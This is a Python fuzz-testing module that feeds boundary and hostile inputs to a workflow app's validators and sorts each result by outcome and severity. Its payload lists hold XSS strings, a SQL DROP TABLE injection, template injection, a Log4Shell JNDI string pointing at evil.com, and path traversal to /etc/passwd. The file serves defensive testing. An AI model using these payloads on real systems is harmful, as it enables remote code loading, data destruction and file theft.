"""
Input boundary and fuzz analysis for all workflow user-input fields.

Tests each (field, fuzz_class) pair by passing the value through the relevant
validation layer (schema validators, pre-hooks, form validators) without
starting a full pipeline. Records whether the value was:
  - rejected before reaching the backend (BLOCKED_PRE)
  - mutated silently (MUTATED)
  - passed through unchanged (PASSED)
  - caused an unhandled exception (EXCEPTION)
"""
from __future__ import annotations

import re
import sys
import os
from dataclasses import dataclass
from pathlib import Path

# Allow importing from project root
_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(_ROOT))


# ---------------------------------------------------------------------------
# Fuzz classes
# ---------------------------------------------------------------------------

FUZZ_CLASSES: dict[str, list] = {
    "text_empty": ["", "   ", "\t\n", "\r\n"],
    "text_overlong": ["A" * 10_001, "A" * 100_001],
    "text_special": [
        "<script>alert(1)</script>",
        "'; DROP TABLE cases;--",
        "<img src=x onerror=alert(1)>",
        "{{7*7}}",                        # Jinja2/template injection
        "${jndi:ldap://evil.com/x}",      # Log4Shell pattern
        "\x00\x01\x02",                   # Null/control bytes
        "null", "undefined", "None",
    ],
    "text_path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\cmd.exe",
        "%2e%2e%2f%2e%2e%2f",
        "....//....//",
    ],
    "text_pii": [
        "passport: AB123456",
        "account number: 1234567890123456",
        "SSN: 123-45-6789",
        "card: 4111111111111111",
        "iban: AE070331234567890123456",
    ],
    "date_invalid": [
        "not-a-date", "2099-13-45", "01/01/2024",
        "yesterday", "now", "0000-00-00", "",
    ],
    "number_boundary": [-1, 0, -999, 999_999_999, float("inf"), float("nan")],
    "enum_invalid": ["", "INVALID_CHOICE", "null", "0", "true", "TRUE", None],
    "slug_traversal": [
        "../../../etc",
        "con", "nul", "prn", "aux",       # Windows reserved names
        ".", "..", " ", "",
        "a" * 256,                         # overlong
        "valid/../escape",
        "\x00null",
    ],
    "file_path_traversal": [
        "../../../etc/passwd.pdf",
        "malware.exe.pdf",
        "a" * 256 + ".pdf",
        "/absolute/path/file.pdf",
        "file\x00.pdf",
    ],
}


# ---------------------------------------------------------------------------
# Result model
# ---------------------------------------------------------------------------

@dataclass
class FuzzResult:
    field: str
    fuzz_class: str
    fuzz_value: str
    outcome: str         # "BLOCKED_PRE" | "MUTATED" | "PASSED" | "EXCEPTION"
    detail: str          # error message or mutation description
    severity: str        # "HIGH" | "MEDIUM" | "LOW" | "INFO"


# ---------------------------------------------------------------------------
# Field → fuzz class mapping
# ---------------------------------------------------------------------------

FIELD_FUZZ_MAP: dict[str, list[str]] = {
    # Core identity fields
    "client_name":            ["text_empty", "text_special", "text_overlong"],
    "industry":               ["text_empty", "text_special"],
    "description":            ["text_empty", "text_special", "text_pii", "text_overlong"],
    "engagement_description": ["text_empty", "text_special", "text_pii"],
    "situation":              ["text_empty", "text_special", "text_pii"],
    "trigger":                ["text_empty", "text_special"],
    "constraints":            ["text_special", "text_pii"],
    "red_flags":              ["text_special", "text_pii"],

    # Slug / project name
    "project_name":           ["slug_traversal", "text_empty", "text_special"],
    "engagement_name":        ["slug_traversal", "text_empty", "text_special"],

    # Date fields (unvalidated in Streamlit UI)
    "date":                   ["date_invalid", "text_special"],
    "dob":                    ["date_invalid", "text_special", "text_empty"],
    "date_range":             ["date_invalid", "text_special"],

    # Numeric fields
    "duration_minutes":       ["number_boundary"],
    "slide_count":            ["number_boundary"],
    "population_count":       ["number_boundary"],
    "daily_rate":             ["number_boundary"],

    # Enum/select fields
    "investigation_type":     ["enum_invalid"],
    "audience":               ["enum_invalid"],
    "subject_type":           ["enum_invalid"],
    "screening_level":        ["enum_invalid"],
    "report_language":        ["enum_invalid"],
    "research_mode":          ["enum_invalid"],
    "doc_type":               ["enum_invalid"],
    "persona":                ["enum_invalid"],

    # Path fields
    "engagement_letter_path": ["text_path_traversal", "file_path_traversal", "text_empty"],
    "logo_path":              ["text_path_traversal", "file_path_traversal", "text_empty"],

    # Subject / sanctions fields
    "subject_name":           ["text_empty", "text_special", "text_overlong"],
    "nationalities":          ["text_special", "text_empty"],
    "aliases":                ["text_special", "text_pii"],
    "operating_jurisdictions":["text_empty", "text_special"],

    # Workspace key-suffix fields (slug used as session_state key suffix)
    "workspace_slug":         ["slug_traversal"],

    # API key fields
    "anthropic_api_key":      ["text_empty", "text_special"],
}


# ---------------------------------------------------------------------------
# Validators to test
# ---------------------------------------------------------------------------

def _check_sanitize_pii(value: str) -> FuzzResult | None:
    """Test that sanitize_pii hook strips PII from free-text fields."""
    try:
        from hooks.pre_hooks import sanitize_pii
        payload = {"description": value, "case_id": "TEST-001", "workflow": "test"}
        context: dict = {}
        mutated = sanitize_pii(payload, context)
        original = value
        result_val = mutated.get("description", value)
        if result_val != original:
            return FuzzResult(
                field="description", fuzz_class="text_pii",
                fuzz_value=repr(value)[:80],
                outcome="MUTATED",
                detail=f"PII stripped: {repr(original)[:40]} → {repr(result_val)[:40]}",
                severity="INFO",
            )
        # PII was NOT stripped — this is a finding
        return FuzzResult(
            field="description", fuzz_class="text_pii",
            fuzz_value=repr(value)[:80],
            outcome="PASSED",
            detail="PII value passed through sanitize_pii unchanged",
            severity="HIGH",
        )
    except ImportError:
        return None
    except Exception as e:
        return FuzzResult(
            field="description", fuzz_class="text_pii",
            fuzz_value=repr(value)[:80],
            outcome="EXCEPTION",
            detail=str(e),
            severity="MEDIUM",
        )


def _check_validate_input(case_id: str, workflow: str) -> FuzzResult:
    """Test that validate_input pre-hook blocks missing required fields."""
    try:
        from hooks.pre_hooks import validate_input
        from core.hook_engine import HookVetoError
        payload = {"case_id": case_id, "workflow": workflow}
        context: dict = {}
        try:
            validate_input(payload, context)
            return FuzzResult(
                field="case_id/workflow", fuzz_class="text_empty",
                fuzz_value=f"case_id={repr(case_id)}, workflow={repr(workflow)}",
                outcome="PASSED" if (case_id and workflow) else "PASSED_SHOULD_BLOCK",
                detail="validate_input did not raise HookVetoError for empty fields",
                severity="HIGH" if not (case_id and workflow) else "INFO",
            )
        except HookVetoError as e:
            return FuzzResult(
                field="case_id/workflow", fuzz_class="text_empty",
                fuzz_value=f"case_id={repr(case_id)}, workflow={repr(workflow)}",
                outcome="BLOCKED_PRE",
                detail=str(e),
                severity="INFO",
            )
    except ImportError as e:
        return FuzzResult(
            field="case_id/workflow", fuzz_class="text_empty",
            fuzz_value="import_error",
            outcome="EXCEPTION",
            detail=f"Import failed: {e}",
            severity="MEDIUM",
        )


def _check_derive_slug(value: str) -> FuzzResult:
    """Test derive_slug() path-traversal protection."""
    try:
        from schemas.project import derive_slug
        try:
            slug = derive_slug(value)
            # Check result is safe
            if ".." in slug or "/" in slug or "\\" in slug or "\x00" in slug:
                return FuzzResult(
                    field="project_name", fuzz_class="slug_traversal",
                    fuzz_value=repr(value)[:80],
                    outcome="PASSED",
                    detail=f"UNSAFE slug produced: {repr(slug)}",
                    severity="HIGH",
                )
            return FuzzResult(
                field="project_name", fuzz_class="slug_traversal",
                fuzz_value=repr(value)[:80],
                outcome="MUTATED",
                detail=f"Sanitised to: {repr(slug)[:40]}",
                severity="INFO",
            )
        except (ValueError, TypeError) as e:
            return FuzzResult(
                field="project_name", fuzz_class="slug_traversal",
                fuzz_value=repr(value)[:80],
                outcome="BLOCKED_PRE",
                detail=str(e),
                severity="INFO",
            )
    except ImportError as e:
        return FuzzResult(
            field="project_name", fuzz_class="slug_traversal",
            fuzz_value=repr(value)[:80],
            outcome="EXCEPTION",
            detail=f"Import failed: {e}",
            severity="MEDIUM",
        )


def _check_case_intake_schema(field_name: str, value) -> FuzzResult:
    """Test CaseIntake Pydantic schema rejects invalid values."""
    try:
        from schemas.case import CaseIntake
        kwargs = {
            "case_id": "TEST-001",
            "client_name": "TestCo",
            "industry": "Finance",
            "workflow": "investigation_report",
            "description": "test engagement",
            field_name: value,
        }
        try:
            CaseIntake(**kwargs)
            return FuzzResult(
                field=field_name, fuzz_class="enum_invalid",
                fuzz_value=repr(value)[:80],
                outcome="PASSED",
                detail="CaseIntake accepted invalid enum value without raising",
                severity="MEDIUM" if value not in ("", None) else "LOW",
            )
        except Exception as e:
            return FuzzResult(
                field=field_name, fuzz_class="enum_invalid",
                fuzz_value=repr(value)[:80],
                outcome="BLOCKED_PRE",
                detail=str(e)[:120],
                severity="INFO",
            )
    except ImportError as e:
        return FuzzResult(
            field=field_name, fuzz_class="enum_invalid",
            fuzz_value=repr(value)[:80],
            outcome="EXCEPTION",
            detail=f"Import failed: {e}",
            severity="MEDIUM",
        )


def _check_date_field(value: str) -> FuzzResult:
    """Date fields in Workspace have NO validation in UI. Test what reaches backend."""
    # Streamlit just passes the text_input value as a string. Check if any schema validates it.
    is_valid_iso = False
    try:
        import datetime
        datetime.date.fromisoformat(str(value))
        is_valid_iso = True
    except (ValueError, TypeError):
        pass

    if not is_valid_iso and value not in ("", None):
        return FuzzResult(
            field="date", fuzz_class="date_invalid",
            fuzz_value=repr(value)[:80],
            outcome="PASSED",
            detail="Invalid date reaches backend — no UI or schema validation gate",
            severity="MEDIUM",
        )
    return FuzzResult(
        field="date", fuzz_class="date_invalid",
        fuzz_value=repr(value)[:80],
        outcome="BLOCKED_PRE" if not is_valid_iso else "PASSED",
        detail="Valid ISO date" if is_valid_iso else "Empty date",
        severity="INFO",
    )


def _check_number_field(field: str, value) -> FuzzResult:
    """Number inputs: Streamlit enforces min/max but direct API call bypasses it."""
    if isinstance(value, float) and (math.isnan(value) or math.isinf(value)):
        return FuzzResult(
            field=field, fuzz_class="number_boundary",
            fuzz_value=repr(value),
            outcome="PASSED",
            detail="nan/inf value — Streamlit number_input returns float; downstream schema may not reject",
            severity="MEDIUM",
        )
    if isinstance(value, (int, float)) and value < 0:
        return FuzzResult(
            field=field, fuzz_class="number_boundary",
            fuzz_value=repr(value),
            outcome="PASSED",
            detail="Negative number — Streamlit min_value guard bypassed via direct API",
            severity="LOW",
        )
    return FuzzResult(
        field=field, fuzz_class="number_boundary",
        fuzz_value=repr(value),
        outcome="PASSED",
        detail="Extreme value — may cause downstream issues",
        severity="LOW",
    )


import math


# ---------------------------------------------------------------------------
# Main fuzz runner
# ---------------------------------------------------------------------------

def run_fuzz_analysis() -> list[FuzzResult]:
    results: list[FuzzResult] = []

    # 1. PII sanitisation coverage
    for pii_val in FUZZ_CLASSES["text_pii"]:
        r = _check_sanitize_pii(pii_val)
        if r:
            results.append(r)

    # 2. validate_input pre-hook — empty required fields
    for empty in ["", "   ", None]:
        results.append(_check_validate_input("", "investigation_report"))
        results.append(_check_validate_input("TEST-001", ""))
        break  # one pass is sufficient

    # 3. derive_slug path-traversal
    for val in FUZZ_CLASSES["slug_traversal"] + FUZZ_CLASSES["text_path_traversal"]:
        results.append(_check_derive_slug(str(val)))

    # 4. CaseIntake schema — language field (has Literal validation)
    for val in FUZZ_CLASSES["enum_invalid"]:
        results.append(_check_case_intake_schema("language", val))

    # 5. Date fields (no UI validation)
    for val in FUZZ_CLASSES["date_invalid"]:
        results.append(_check_date_field(val))

    # 6. Number boundary fields
    for field in ["duration_minutes", "slide_count", "population_count"]:
        for val in FUZZ_CLASSES["number_boundary"]:
            results.append(_check_number_field(field, val))

    # 7. Special character injection in free-text → sanitize_pii or schema
    for val in FUZZ_CLASSES["text_special"]:
        r = _check_sanitize_pii(val)
        if r:
            results.append(r)

    return results


def summarise_fuzz(results: list[FuzzResult]) -> dict:
    by_severity: dict[str, list[FuzzResult]] = {"HIGH": [], "MEDIUM": [], "LOW": [], "INFO": []}
    by_outcome: dict[str, int] = {}
    for r in results:
        by_severity.setdefault(r.severity, []).append(r)
        by_outcome[r.outcome] = by_outcome.get(r.outcome, 0) + 1

    high_findings = [r for r in results if r.severity == "HIGH" and r.outcome != "BLOCKED_PRE"]
    passed_pii    = [r for r in results if r.fuzz_class == "text_pii" and r.outcome == "PASSED"]

    return {
        "total_tests": len(results),
        "by_outcome": by_outcome,
        "high_severity_findings": len([r for r in results if r.severity == "HIGH"]),
        "medium_severity_findings": len([r for r in results if r.severity == "MEDIUM"]),
        "unblocked_high": [f"{r.field}/{r.fuzz_class}: {r.detail}" for r in high_findings],
        "pii_passed_through": [r.fuzz_value for r in passed_pii],
        "by_severity_count": {k: len(v) for k, v in by_severity.items()},
    }
